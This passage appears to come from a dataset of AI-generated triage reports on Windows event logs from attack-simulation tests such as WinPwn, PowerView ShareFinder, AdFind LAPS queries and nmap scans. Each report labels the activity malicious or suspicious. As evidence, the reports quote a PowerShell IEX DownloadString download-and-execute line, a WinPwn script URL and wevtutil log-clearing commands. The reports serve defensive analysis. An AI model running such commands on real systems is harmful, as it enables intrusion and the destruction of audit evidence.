   - The execution of `wevtutil` to clear the logs (as seen in the Sysmon log) multiple times shortly before the logs are cleared (Event 1102) is suspicious. This action indicates an attempt to cover the tracks after performing operations that might have compromised the system.

4. **Command Execution**:
   - Execution of `cmd.exe` with a sequence of commands (`net.exe` and `net1.exe`) is suspicious, especially when used to list services. While this alone isn't malicious, combined with log clearing, it suggests reconnaissance or preparation for further actions.

5. **Frequent Use of `wevtutil.exe`**:
   - The multiple instances of `wevtutil.exe` being called to clear logs for different channels (System, Security, Windows PowerShell) is highly suspicious and aligns with actions taken to delete evidence.
   
6. **System Activities and Updates**:
   - Regular updates, like those by `Microsoft Edge` and `Microsoft Defender`, appear standard. However, frequent installations and updates within a short timeframe, especially where logs are manipulated, could support malicious operations disguised as legitimate processes.

### Conclusion:
Given the combination of events:
- Security log being cleared (EventID: 1102)
- Frequent utilization of privileged and potentially dangerous actions by `admin_test`
- Evidence of log manipulation and command execution from elevated command lines

The situation strongly suggests malicious activity, as these actions align with common techniques used by attackers to gain and maintain unauthorized access to a system while attempting to erase tracks.

### Resolution:
**MALICIOUS**

### Guidance:
- **Immediate Steps**: Conduct a full forensic analysis to determine the extent of the compromise. Isolate the affected system from the network to prevent further unauthorized access or dissemination of malicious activity.
- **Incident Response**: Engage the incident response team to handle the situation based on established procedures.
- **Monitoring and Detection**: Enhance monitoring of similar activities across the network, especially focusing on privileged accounts and unusual command executions.
- **Review and Revise Access Controls**: Evaluate and tighten privileged access management to mitigate risks from insider threats or compromised accounts."
Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),"Upon analyzing the provided Windows event logs, several points of interest are evident relating to potential malicious activity:

1. **Event Log Clearance:**
   - The logs indicate that the security log, system log, and Windows PowerShell logs were cleared (Event ID 1102). This action is often a red flag as clearing logs can be an attempt to hide malicious activity. The user `admin_test` performed these actions.

2. **Use of PowerShell:**
   - The logs show the use of PowerShell with the command `Get-ADUser` (event from the Sysmon log and Windows PowerShell log). Although `Get-ADUser` is a legitimate tool used in Active Directory environments, its usage in conjunction with log clearance raises suspicions.

3. **High-Privilege Operations:**
   - The logs include events with security identifiers (SIDs) and elevated privileges (Event ID 4672), specifically with the user account `SYSTEM` having numerous privileges including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which can facilitate privilege escalation and may indicate privilege abuse.

4. **Presence of SYSTEM and NT AUTHORITY account activity:**
   - Multiple logs show SYSTEM and NT AUTHORITY activity across the system, such activities include starting services and system repair operations. While some level of activity from these accounts is expected, it is important to scrutinize any activity coinciding with log clearances.

5. **Unusual Process Executions:**
   - The use of `wevtutil.exe` for clearing event logs and `whoami.exe` for checking user privileges are noted alongside typical Windows processes. Under regular operations, `wevtutil.exe` should not regularly appear; its presence in the context of log clearance is highly suspicious.

Given these activities, it strongly suggests potential malicious intent, as these actions align with common tactics used in cyber intrusions to obscure tracks and elevate privileges:

**Assessment: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Investigation:** Conduct a comprehensive investigation into the user account `admin_test` to understand its role and behavior patterns. Verify if this activity was expected or sanctioned by IT or security protocols.
   
2. **Incident Response:** Implement appropriate incident response actions. These should include isolating impacted systems, preserving forensic evidence, and preventing further unauthorized access.

3. **Log Monitoring:** Reinstate and enhance logging mechanisms to ensure complete capture, and monitor logs for any subsequent anomalies or signs of tampering.

4. **Review System Security Policies:** Ensure all system security policies are in place, paying close attention to user account management, privileged access controls, and the least privilege principle.

5. **User Awareness and Training:** Advise users, especially those with administrative privileges, on best practices for system usage and signs of potential phishing or cyber intrusion attempts."
Device Driver Discovery,"Upon reviewing the provided logs, I identified several key points to focus on for analysis:

1. **Usage of `wevtutil.exe`:** 
   - There are multiple instances in the logs where `wevtutil.exe` is executed by the user `SERVER002\admin_test`, specifically with commands purging logs from the Application, System, and Security event channels. This is done using the `cl` (clear log) command.
   - Clearing event logs can be a sign of an attacker attempting to cover their tracks after unauthorized actions. However, this can also be legitimate if done by a system administrator during maintenance or troubleshooting.

2. **Privileges and Logons:**
   - The account `admin_test` has high integrity levels and several privileges, such as `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, and others, which are typical for administrative accounts.
   - `4672` events indicate the use of special privileges that could be associated with potential privilege escalation activity.

3. **Time Anomaly:**
   - Security log shows an event (`EventID 4616`) indicating a time change that may suggest an attempt to manipulate timestamps to evade detection (`NewTime` is earlier than `OldTime`).
   - Altering system time unexpectedly, especially by a service, could raise red flags about an attacker trying to tamper with time-related security logs.

4. **Unusual Commands:**
   - In the PowerShell logs, the PowerShell `driverquery` command is run. While this command lists installed drivers, its use alongside others (e.g., `whoami`, `hostname`) may suggest enumeration activity.
   - This behavior is consistent with information gathering by threat actors post-compromise.

5. **Edge Update Executions:**
   - Numerous entries related to Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`). While most updates are benign software maintenance activities, the execution frequency and occurrence from temporary directories should be scrutinized, though they may still align with automated update routines.

6. **Log Files Cleared:**
   - The presence of multiple events suggesting log files were cleared without accompanying explanatory context or regular maintenance announcements could strongly suggest attempts to obscure activities post-incident.

### Assessment and Resolution:

The logs exhibit a pattern of activities that align with potential malicious behavior:
- Consistent log clearing with no known defensible context.
- High privileged access with rapid execution of commands associated with potential post-exploitation enumeration.
- Manipulation of time records could be designed to obscure timelines.

Considering the cumulative analysis:
- **Resolution:** **MALICIOUS**
- **Guidance:** Immediate steps should be to:
  - Conduct a detailed investigation on the `admin_test` account activities and credentials.
  - Review audit logs and related alerts, especially around registry or privilege changes.
  - Compare this system’s baseline behavior against this detected anomaly and ascertain any unauthorized changes.
  - Implement stricter monitoring on log clearance activities and a more robust alerting mechanism for similar future anomalies.
- Incident response teams should be activated to conduct deeper forensics and mitigate potential compromises."
WinPwn - MS17-10,"Based on the provided Windows event logs, there is notable suspicious and potentially malicious activity observed in the logs. Here is a detailed breakdown of the findings:

### Indicators of Malicious Activity:

1. **Log File Clearing:**
   - System, Windows PowerShell, and Security event logs were all cleared within the same narrow time frame (`EventID 104` for System and PowerShell, `EventID 1102` for Security). This action is typically used to cover tracks of malicious activity on a system.

2. **PowerShell Execution:**
   - Multiple PowerShell instances were logged that executed a script from a GitHub repository related to ""WinPwn"" which is known for penetration testing and exploitation (`HostApplication=powershell.exe & {...\nMS17-10 -noninteractive -consoleoutput}`). The use of download and execute a script from the Internet is a significant red flag, especially those that target specific vulnerabilities like the `MS17-10` (related to the EternalBlue exploit used in WannaCry).

3. **Process Creation with Elevated Privileges:**
   - The log indicates suspicious process creation (e.g., `wevtutil.exe`, `conhost.exe`) which is being run by the `admin_test` user with high integrity levels. This can indicate privilege escalation or an attempt to manipulate system processes for malicious purposes.

4. **Time Manipulation:**
   - The logs show an event where the system time was manipulated (`EventID 4616`). Changing system time can be an indicator of attempts to bypass security controls or to manipulate timestamp logs in file systems for malicious purposes.

### Assessment of the Situation:
The combination of log clearing, PowerShell script execution targeting the well-known MS17-10 vulnerability, possible privilege escalation, and system time manipulation strongly indicates malicious activity.

### Threats or Risks Identified:
- **Potential Compromise of the System:**
  The system might have been compromised using the MS17-10 vulnerability, which is a critical security risk allowing remote code execution. This could allow an attacker to gain full control over the system.
- **Persistence and Evasion:**
  Clearing of logs and execution of potentially malicious PowerShell scripts indicate an attempt to maintain persistence on the system and evade detection.

### Recommended Next Steps:
1. **Immediate Isolation:** Disconnect the affected system (`Server002`) from the network to prevent further spread or damage.
2. **Full Malware Scan:** Conduct a comprehensive scan using updated antivirus/malware tools.
3. **Incident Response:** Engage with your incident response team to conduct a full forensic analysis to understand the scope and impact of the compromise.
4. **Patching:** Ensure all systems, especially those with Windows SMBv1, are patched against known vulnerabilities like MS17-10.
5. **Review and Audit:** Retrieve security logs from backups (if available) and audit other systems for similar indicators of compromise.

### Resolution:
**MALICIOUS** - The logs contain evidence of malicious activity with an attempt to exploit known vulnerabilities and the subsequent clearing of logs to cover these tracks."
Port Scan NMap for Windows,"Upon reviewing the provided Windows event logs, several points of potential interest and concern arise:

1. **Log Cleared Events:** There are several log-clearing events that stand out. The following events indicate that logs were cleared:
   - EventID 104 (System log): The System and Windows PowerShell logs were cleared by the user `admin_test`.
   - EventID 1102 (Security log): The Security log was cleared by the same user.

   Clearing logs is often an attempt to hide malicious activity and should be considered a red flag, though it could also be a legitimate administrative task.

2. **Suspicious Command Execution:**
   - The use of `nmap` detected in the PowerShell logs and Sysmon logs is suspicious. It indicates that a network scanning tool was executed through PowerShell (`powershell.exe & {nmap 127.0.0.1}`).
   - The launching of `cmd.exe` with command line arguments to run `nmap` suggests a potentially unauthorized network scan was conducted by the user `admin_test`.

3. **Installation of Potentially Unwanted Software:**
   - Event entries related to the installation of `nmap` (`nmap-7.80-setup.exe`) and associated components like `Npcap`, which are components often used together with `nmap` for network packet capturing, appear multiple times.
   - There is also evidence of software installation via MSI packages, including Microsoft Visual C++ Redistributables which might be requirements for `nmap` or other software installed in this sequence. 

4. **Scheduled Task Creation:**
   - An instance of `schtasks.exe` is observed creating a task named `npcapwatchdog`, which appears to relate to Npcap software. This could be a persistent mechanism if used maliciously.

5. **Use of Certutil for Certificate Operations:**
   - The use of `certutil` to add certificates (`Insecure-SHA1.cer` and `Insecure-EV.cer`) is noteworthy, as `certutil` can be abused for operations beyond its intended use, such as downloading files or performing malicious certificate operations.

### Assessment:
- **SUSPICIOUS**: The combination of log clearing, use of `nmap`, suspicious installations, and certificate manipulations suggests activity that merits further investigation. This behavior could be indicative of malicious activity or a security audit being conducted without the proper channels.

### Guidance:
- Confirm whether the use of `nmap` and log clearing were part of any scheduled security assessments or other legitimate administrative activity.
- Check for any unauthorized access or anomalies in user behavior patterns associated with the `admin_test` user account.
- Evaluate the installed software and scheduled tasks for legitimacy and compliance with company policy.
- Review the system for additional indications of compromise or unauthorized activities, focusing on persistence mechanisms.
- If unauthorized activity or compromise is suspected, consider isolating the host and conducting a deeper forensic investigation.

Based on the provided logs, these actions should help ascertain whether the observed activities are justifiable or require escalation as a potential security incident."
Get-DomainGPO to display group policy information via PowerView,"Based on the logs provided, there are several indicators of potential malicious activity:

### Suspicious Behavior Observed:

1. **PowerShell Activity:**
   - **Indicators of Malicious Command Execution:** The PowerShell logs feature commands that use flags such as `-nop` (which stands for no profile) and `-exec bypass`, which are often used to execute scripts without logging and to bypass execution policies, respectively. The command `IEX (New-Object Net.WebClient).DownloadString('https://...')` is a common way to download and execute a script from the web, a technique often used by attackers to deliver and execute payloads on a victim's machine.
   - **Specific Script:** The script being downloaded is associated with ""Empire,"" which is a well-known post-exploitation framework. This makes the PowerShell script execution particularly suspicious and potentially malicious.

2. **Event Log Clearing:**
   - Multiple event logs, specifically the Security and System logs, were cleared by a user named `admin_test`. This behavior often indicates an attempt to cover tracks following unauthorized or suspicious activities.

3. **Sysmon Logs:**
   - There are several executions of system utilities, such as `wevtutil.exe`, which is used to clear event logs, further indicating an attempt to hide actions on the system.
   - Several PowerShell instances related to the same suspicious script execution were observed, indicating repeated attempts to run or ensure the execution of the PowerShell script.

### Assessment:
- **Malicious Intent:** The combination of the specific PowerShell command used, association with a known malicious framework (Empire), and efforts to clear event logs are strong indicators of malicious actions. The user `admin_test` appears to be involved, as per the logs, in executing these tasks.

### Recommended Action:
1. **Resolution: MALICIOUS** - This activity is clearly malicious based on the use of the Empire framework, PowerShell usage patterns, and actions to cover tracks.
2. **Immediate Containment:** Isolate the machine to prevent further spread or communication with command-and-control (C2) servers.
3. **Credentials Check:** Investigate and potentially reset the credentials of users, especially `admin_test`, to prevent further misuse.
4. **Full System Scan:** Conduct a thorough malware scan and check for additional persistence mechanisms deployed by the attacker.
5. **Incident Response:** Launch a full incident response process to understand the breach's extent and secure other systems potentially at risk.

This evidence clearly shows an intention to exploit the system, execute remote commands, and erase traces of these actions, pointing to a sophisticated infiltration attempt."
Detect Virtualization Environment via WMI Manufacturer-Model Listing (Windows),"Upon reviewing the provided Windows event logs, here is a detailed analysis highlighting suspicious and potentially malicious activities:

### Analysis:

1. **Log File Clearance:**
   - There are multiple instances of event logs being cleared using `wevtutil.exe`, noted in both the security and system logs. Specifically, EventID 1102 (Security log file cleared) is indicative of an event log clearance by the user `admin_test`. The use of `wevtutil.exe` is confirmed by Sysmon events with commands executed by `SERVER002\admin_test`.
   - Event logs are typically cleared to cover tracks after unauthorized or malicious activity, making this activity suspect.

2. **PowerShell Activity:**
   - PowerShell is used with a command to check the system's virtualization status. While this script itself does not seem inherently malicious, the timing and sequence of this action suggest it might be part of a reconnaissance effort or a broader intrusion tactic. The use of WMI (Windows Management Instrumentation) within scripts is commonly found in suspicious activity.

3. **Time Changes/Manipulation:**
   - The time synchronization and subsequent log entries (EventID 4616 indicating TimeChanged) suggest alterations in system time, which can be manipulated to interfere with log timestamps as a method to obfuscate unauthorized activities.

4. **Process Executions:**
   - The sequential execution of system binaries like `hostname.exe` and `whoami.exe` can be typical for enumeration purposes during lateral movement or after initial access. 
   - The execution by `admin_test` immediately following log clearance and possible timestamp manipulation implies possible discovery actions.

5. **EdgeUpdate Activity:**
   - The presence of Microsoft Edge Update-related activities is generally benign but should be monitored as it implies system-level processes interacting with the system, which could be hijacked or spoofed.

### Conclusion:

Based on the analysis, the logs indicate potentially **MALICIOUS** activity. The combination of log clearance actions, the PowerShell script for environment reconnaissance, time changes, and execution of system binaries (potential discovery phase activities), suggest a high likelihood of compromise.

### Recommendations:

1. **Immediate Incident Response:**
   - Initiate a comprehensive incident response involving isolating the system, capturing memory, and further forensic analysis to verify and remove threats.

2. **Audit and Monitoring:**
   - Implement enhanced auditing and monitoring for future detection of log clearance and PowerShell executions.
   - Consider deploying additional security tools that can provide more real-time alerting on such activities.

3. **User Access Review:**
   - Conduct a review of the `admin_test` account activities and determine if the account was compromised. Consider a password reset or disabling the account if not critically needed.

4. **System Integrity Checks:**
   - Perform integrity checks of critical system files and configurations, ensuring no unauthorized changes have occurred.

5. **Security Controls Assessment:**
   - Re-evaluate security controls and configurations, particularly concerning PowerShell Execution and script logging policies, to prevent misuse in the future."
Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,"### Analysis

The provided Windows event logs have several entries that hint at potentially suspicious activities. Here is a detailed analysis of the logs:

#### Security Log:
1. **Event ID 1102** - **Audit Log Cleared**: 
   - A security audit log was cleared by `admin_test`. This is a red flag as clearing logs can indicate an attempt to cover tracks after unauthorized or malicious activities.
   
2. **Event ID 4616** - **System Time Change**: 
   - The system time was changed by the `LOCAL SERVICE` using `svchost.exe`. Time changes can be indicative of attempts to manipulate time-based security measures or to cover tracks.

#### PowerShell Log:
1. **Suspicious PowerShell Execution**:
   - A PowerShell command executed `AdFind.exe`, a legitimate tool often used for LDAP queries. The context of its use here is suspicious because it queries for sensitive attributes like `ms-Mcs-AdmPwd`.
   - The execution from a temporary directory linked to `AtomicRedTeam` suggests this might be part of a known attack simulation, which is often used for malicious activity posing as legitimate testing.

#### System Log:
1. **Log File Cleared**:
   - Similar to the Security log, system logs being cleared by `admin_test` further correlates to potential log tampering.
   
2. **Event ID 1** - **Unexpected Time Manipulation**:
   - There are multiple entries indicating system time changes by non-standard processes. This is unusual and could relate to attempts to conceal activities.

#### Sysmon Log:
1. **Event ID 1 and 5** - **Process Creation and Termination**:
   - The execution of `wevtutil.exe` with the command line argument `cl` (clear) followed by `Security`, `System`, and `Windows PowerShell` indicates the use of this utility to clear log entries, corroborating the Security and System log findings.
   - The execution and subsequent logs of applications like `whoami.exe`, `hostname.exe`, and `PowerShell` do not indicate anomalies by themselves, but in context, they seem to be part of sequence obscuring activities.

### Assessment

Based on the analysis, there are clear signs of suspicious activities:

- The clearing of multiple log files suggests an attempt to hide actions taken on the system.
- The execution of PowerShell scripts from a temporary directory alongside known tools like `AdFind.exe` used in post-exploitation, without a clear legitimate business purpose, raises an alarm.
- The adjustment of system time combined with log file clearing indicates attempts to disrupt timelines and forensic analysis.

### Resolution: **MALICIOUS**

### Guidance

1. **Immediate Actions**:
   - Isolate the host (Server002) from the network to prevent further compromise or lateral movement within the organization.
   - Investigate the source of the malicious scripts and execute a thorough check for any additional unauthorized tools or scripts.

2. **Forensic Analysis**:
   - Perform a forensic analysis on the host to determine the extent of the compromise, particularly focusing on user accounts, system logs that were not cleared, and any remaining artifacts.

3. **Review Permissions**:
   - Review and audit user permissions, especially those of `admin_test`. 
   - Ensure logging configurations are correctly set to prevent unauthorized clearing and enhance monitoring.

4. **Employee Training**:
   - Provide training to employees on recognizing and reporting suspicious activities. Ensure they understand the implications of log tampering and malicious PowerShell usage.

Prompt and comprehensive action following this assessment will mitigate further risks and help identify the attackers' intent and methods."
View available share drives,"Based on analyzing the logs provided, here is a breakdown of potentially suspicious or malicious activities:

### Security Log:

- **Event ID 1102**: The security log was cleared by the `admin_test` user. Clearing logs can be indicative of an attempt to cover tracks after potentially malicious activity.
  
- **Repeated Event 4616**: Changes to the system time were recorded multiple times. While the time adjustments were small, frequent time changes without a clear justification can also be related to attempts to obscure activity timing.

### System Log:

- **Event ID 104**: System and PowerShell logs have been cleared by the `admin_test` user using the `wevtutil.exe` utility. This action supports potential malicious intent, similar to the clearing of security logs.
  
### Sysmon Logs:

- **Repeated Usage of `wevtutil.exe`**: Multiple executions of `wevtutil.exe` with arguments to clear logs (e.g., ""cl Application"", ""cl System"", ""cl Security""). This utility is legitimately used for managing event logs but can be leveraged to delete logs and cover up actions, which fits a potential attack pattern.
  
- **Commands Executed**: The presence of command execution such as `cmd.exe` with arguments like ""/c net share"" suggests enumeration or potential lateral movement activities typical in a compromise scenario.

- **Processes Executed with High Integrity**: `HOSTNAME.EXE`, `WHOAMI.EXE`, `wevtutil.exe`, and `cmd.exe` were executed with high integrity, indicating that the `admin_test` user had elevated privileges. This could indicate privilege escalation or administrative access to conduct actions requiring elevated permissions.

### Application Log:

- **Edge Update**: Normal update processes related to Microsoft Edge Update. This seems to be benign and typical behavior for a system updating its software components.

### Conclusion:

There’s a significant indication of suspicious behavior primarily revolving around the clearing of logs (security, system, and PowerShell) using `wevtutil.exe`, which is associated with covering up activities on a compromised system. The `admin_test` account has been involved in these activities and this, combined with the execution of diagnostic commands and elevated permissions access, suggests potential malicious behavior.

### Resolution:

**SUSPICIOUS** - The logs exhibit behavior that is typically associated with a potential compromise, mainly due to the actions to clear logs and use of elevated privileges. Further investigation is warranted to verify that this activity was authorized and part of routine system maintenance. Immediate actions should include:
- Reviewing any other anomalies in access logs.
- Verifying the intent behind the `admin_test` account's actions.
- Checking whether these activities align with any authorized system maintenance or scheduled tasks.
- Monitoring user activities for any further suspicious behavior."
Enumerate Remote Hosts with Netscan,"Based on the analysis of the provided Windows event logs, here is the detailed assessment:

### Suspicious and Anomalous Behavior:
1. **Event Log Clearing:**
   - The security log event (EventID 1102) and system log events (EventID 104) indicate that logs from multiple channels, including Security and System, were cleared. This is executed by the user `admin_test` and using `wevtutil.exe`. Clearing event logs is a common technique used by attackers to hide their tracks after unauthorized or malicious activities.

2. **Suspicious PowerShell Activity:**
   - There is evidence of Windows PowerShell executing a network scan tool (`netscan.exe`) stored in a temporary path, as shown in the PowerShell and Sysmon logs. The tool is executed using a command-line entry that points to the directory associated with atomic red team simulation exercises. This behavior is typical for penetration testing or red team exercises but can also indicate an unauthorized network discovery attempt if not sanctioned.

3. **Credentials Access Anomalies:**
   - Multiple occurrences of EventID 5379 show credential access attempts that failed (ReturnCode 3221226021). This could either be part of normal process or attempts to access credentials, perhaps during unauthorized activity.

4. **Privilege Elevated Token:**
   - EventID 4672 shows a log entry for using elevated privileges with a list of powerful administrative capabilities, which may be part of system configuration tasks or potentially unauthorized privilege escalation.

### Threats and Risks Identified:
- The combination of log clearing activities along with suspicious use of PowerShell to run a network scanning tool without additional context or authorization suggests potential reconnaissance activities or an internal security assessment which was not announced or logged properly.
  
- Unauthorized network scanning can expose systems to attackers if sensitive information is improperly handled or if the scans themselves introduce vulnerabilities.

- Log clearance without prior legitimate context or approval could hide integrative abnormal activities or even a breach.

### Guidance on How to Proceed:
- Immediately verify if `admin_test` had authorization to clear logs and run network scanning tools, such as a pen-test or internal audit.
- Conduct a detailed review of user access logs surrounding this timeframe to ensure there were no unauthorized access attempts.
- Review system activity, including network traffic logs, around the identified timestamps to determine if there are any other indications of compromise.
- Restrict the execution of PowerShell scripts and the utility of `wevtutil.exe` without proper logging and authentication in place.
- Ensure proper audit logs are kept to analyze and track such activities more comprehensively in the future.

### Resolution:
- **SUSPICIOUS**: Given the combination of events - namely the log clearing, use of PowerShell for running scanning tools from non-standard directories, and the need for further investigation into user actions and network traffic at that time - the situation is marked as SUSPICIOUS. Further investigation is required to determine if it's part of an authorized security exercise or an attempted malicious activity."
Peripheral Device Discovery via fsutil,"Based on the provided logs, let's analyze the different logs and look for any suspicious activity:

1. **Application Log:**
   - We notice that there are entries related to the 'edgeupdate' service stopping at multiple instances.
   - The presence of 'Microsoft-Windows-Security-SPP' (Software Protection Platform) logging a seemingly benign task related to time does not appear suspicious on its own.

2. **System Log:**
   - Two events indicate that logs for ""System"" and ""Windows PowerShell"" channels were cleared by a user named ""admin_test"". Clearing logs without a valid reason is suspicious behavior as it could be an attempt to hide traces of malicious activity.
   - The security log was also cleared by the same user, which is another red flag.
   - No privileges escalation or unusual user privileges were detected, assuming ""admin_test"" has appropriate permissions.

3. **Security Log:**
   - Contains log clearance events with the SubjectUserName as ""admin_test"", corroborating System log findings. This action might indicate an attempt to hide some activity.

4. **Sysmon Log:**
   - Various legitimate Windows processes like `hostname.exe`, `wevtutil.exe`, `fsutil.exe`, and others are being executed by ""admin_test"". 
   - The repeated execution of command-line utilities like `whoami`, `hostname`, `cmd`, and `fsutil` might be a normal operation, but combined with log clearing can be considered suspicious if there's no legitimate reason.
   - The presence of Microsoft Edge Update processes and their UUID-based directories appear typical and align with a legitimate software update process. There’s no indication of tampering or unusual execution patterns here.

**Assessment:**
- The clearing of event logs, particularly security-related logs, by ""admin_test"" suggests an attempt to cover tracks, possibly after executing commands or operations. This behavior is suspicious but not definitively malicious since it could potentially be an administrative task if justified.

**Resolution:**
- **SUSPICIOUS**: The activity of clearing logs and executing several admin-level command-line operations without contextual information or justification elevates the concern level. Further investigation is necessary to understand the intent, which involves confirming the legitimacy of ""admin_test's"" actions, determining if there’s any valid reason for these operations, and potentially checking for other evidence of compromise or rule violations.

**Guidance:**
- Investigate the purpose or task assigned to ""admin_test"" on the specified date to see if any administrative task justifies the observed activities.
- Review any background tasks or processes, especially those corresponding to the time logs were cleared, to detect hidden malicious activities.
- Ensure proper logging configuration, so future log clearances are chained with appropriate audit trails and require justification.
- If unauthorized activity is suspected, quarantine the host, and perform forensic analysis to detect any hidden malicious artifacts."
Enumerate all accounts via PowerShell (Domain),"### Analysis of Event Logs

Upon reviewing the provided Windows event logs, several events stand out that may indicate suspicious activities:

1. **Sysmon Logs:**
   - **Process Creation with `wevtutil.exe`:** There are multiple entries indicating that `wevtutil.exe` was used to clear event logs (specifically clearing the Microsoft-Windows-Sysmon, Application, System, and Security logs). The command-line arguments used include the `cl` (clear) command. Clearing event logs is a common tactic used by adversaries to cover their tracks after exploiting a system.
   - **`conhost.exe`:** Frequent executions of `conhost.exe` as a child process related to `wevtutil.exe` and other system utilities can be leveraged to create hidden command windows or facilitate other suspicious activities.
   - **Powershell Activity:** The logs reveal the execution of PowerShell with a script aimed at gathering user and group information (e.g., `net user /domain, get-localgroupmember -group Users, get-aduser -filter *`). This action can be part of reconnaissance or privilege escalation activities.

2. **Windows PowerShell Logs:**
   - There is an event showing the start of PowerShell with commands to enumerate user and domain information. This is consistent with attempts to gather credentials or escalate privileges within the network.

3. **System and Security Logs:**
   - **Security Event Cleared (Event ID 1102):** The security log being cleared is another indicator of potential malicious activity since it's often cleared to erase evidence of unauthorized actions.
   - **User Actions:** Log entries show a single user account (`admin_test`) conducting these activities with an administrative level of privilege, further indicating potential misuse or compromise of the account.

### Assessment

Based on the observed patterns and the nature of the events—especially the clearing of logs, usage of system utilities to manipulate Windows event logs, and reconnaissance activities—it is highly suspicious and likely indicative of a security incident in progress.

### Resolution

**Resolution: MALICIOUS**

This set of activities strongly suggests unauthorized and potentially malicious actions, possibly from a compromised administrative account. Immediate action is recommended to investigate this activity further and mitigate any ongoing threats.

### Guidance

1. **Isolation and Investigation:**
   - Isolate the affected machine to prevent further unauthorized access.
   - Conduct a thorough investigation into the user account `admin_test`, checking for any signs of compromise or misuse.

2. **Recover and Restore:** 
   - Review backup logs, if available, to retrieve any information lost due to log clearing.
   - Restore the system from known reliable backups to a pre-compromise state if needed.

3. **Preventive Measures:**
   - Implement advanced logging and monitoring to detect similar activities in the future.
   - Strengthen access controls and review security policies around privileged user actions.
   - Educate users about identifying phishing attacks and maintaining good cybersecurity practices."
System Information Discovery with WMIC,"**Analysis of the Logs:**

1. **Repeated Clearing of Logs:**
    - Multiple instances of log files being cleared are detected:
        - Security log was cleared, as indicated by Event ID 1102.
        - System log cleared as noted in the Sysmon log with the execution of `wevtutil.exe` with the ""cl"" option, which means ""clear log"".
        - Windows PowerShell log was also cleared.

2. **Pattern of Log Clearing:**
    - The log file clearing commands are executed using `wevtutil.exe` by the user `SERVER002\admin_test`.
    - These actions occurred within a very short period, which is highly suspicious as such behavior is typical for attackers attempting to cover their tracks.

3. **Usage of `wevtutil.exe`:**
    - `wevtutil.exe` is a legitimate Windows utility to manage event logs, but its usage in this context is suspicious. Such activity might indicate an attempt to clear evidence after malicious activities.

4. **Unusual Command Execution:**
    - The execution of a series of `wmic` commands as indicated by the logs gathered from `cmd.exe` also seems unusual. These commands are typically used to gather system information, which could be legitimate but could also be part of reconnaissance activity by an attacker.

5. **Execution of High Integrity Level Processes:**
    - The processes associated with the log clear operations were executed with high integrity levels, which means they had administrative privileges. This adds another layer of suspicion as these operations require such privileges.

**Assessment:**

Based on the evidence of multiple log clearing events, particularly of Security logs, this behavior strongly indicates an attempt to cover tracks, which aligns with common post-exploitation or malicious activity. The execution of process information gathering commands further adds to the suspicion of potential reconnaissance or preparation for further exploitative actions.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Response:**
    - Isolate the affected host (Server002) from the network to prevent further potential spread of malicious activity.
    - Conduct a comprehensive forensic analysis of the host to identify any additional compromise or persistence mechanisms.

- **Investigation:**
    - Review recent logins and any new user accounts that were created.
    - Inspect running processes, scheduled tasks, and network connections for signs of unauthorized activity.
  
- **Remediation:**
    - Patch all software vulnerabilities that could have been exploited.
    - Change passwords for administrative and potentially affected accounts.
    - Reinforce monitoring and implement stricter logging and alerting policies.

- **Lessons Learned:**
    - Update incident response procedures to include detection and response for log manipulation activities.
    - Educate users and administrators on recognizing and responding to suspicious activities like unauthorized log clearing."
PowerView ShareFinder,"Upon reviewing the provided logs from the Windows host, a few points of interest stand out:

1. **PowerShell Activity**:
    - Multiple PowerShell logs (EventID 600) indicate a command execution that imports the PowerView.ps1 script and executes the `Invoke-ShareFinder` function. PowerView is a well-known PowerShell script used for gathering network information, particularly by attackers to identify accessible network shares. The path indicates that it was potentially downloaded as part of a toolset, suggesting unauthorized or potentially malicious reconnaissance activity.

2. **Log Clearing Activity**:
    - The log entries for the clearing of logs (EventID 104) are concerning. The logs for System, Security, and Windows PowerShell were cleared nearly simultaneously by the user ""admin_test"". Log clearance is a tactic often used to cover tracks, particularly after malicious activity has occurred.

3. **Security Log Events**:
    - The security logs (EventID 4624 and 4672) show logs of service and system accounts performing various operations. While some activity like Privilege Assignments (4672) is routine for certain services, the temporal proximity to other suspicious activities merits further examination.
    - Multiple successful logon events (4624) by NT AUTHORITY\SYSTEM in conjunction with privileged rights being assigned suggest routine operations, however, they should be correlated with legitimate administrative activities.

4. **Sysmon Activity**:
    - Sysmon logs indicate process creation and Image loading of several critical processes. The use of wevtutil.exe to clear logs combined with PowerShell executions aligns with the observed suspicious activity.

5. **Scheduled Tasks / Unauthorized Process Execution**:
    - The wevtutil.exe tool was used to clear logs, which is part of Windows Eventing Command Line Utility, along with sensitive command-line executions, indicating script-based operations potentially aligned with post-exploitation frameworks like Cobalt Strike or PowerShell Empire.

### Assessment
- The presence of PowerView usage, log clearing activity, and corresponding process executions align with techniques often used in reconnaissance and covering tracks in a compromised environment. This overlap suggests that the observed activity fits the profile of a security incident involving potential unauthorized system access and data reconnaissance.

### Resolution
**MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Incident Response**:
   - Isolate the host from the network to prevent further unauthorized actions and lateral movements.
   - Begin forensic imaging of the system for a detailed analysis.

2. **Further Investigation**:
   - Conduct a thorough review of user accounts, especially ""admin_test"", to identify any unauthorized access design patterns or credential misuse.
   - Investigate network logs for other potential connections made by this host that coincide with the timeframe of the suspicious activity.
   
3. **Mitigation and Remediation**:
   - Apply stricter PowerShell script execution policies using Just Enough Administration (JEA) or enabling Constrained Language Mode to limit script execution.
   - Review and adjust Group Policy settings to disable local administrator accounts unless necessary.
   - Strengthen monitoring controls for log clearing and administratively privileged activities.
   - Update antivirus and endpoint detection on all hosts, and conduct a full system scan.

4. **Review Logs and Policies**:
   - Examine the log retention and auditing policies to ensure comprehensive and secure logging.
   - Increase regular audits of security and system logs to detect early indicators of compromise."

  - The logs indicate the execution of PowerShell with the command line that downloads and runs a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`.
  - This behavior is typical of PowerShell scripts used in malicious activities to execute code from an external source, commonly used in ""living off the land"" attacks.
  
### Security Log Analysis:
- **Log file cleared**: 
  - Event ID 1102 indicates that the security log was cleared by `admin_test`. 
  - Clearing event logs is often associated with hiding malicious activities.
- **Privilege Escalation**:
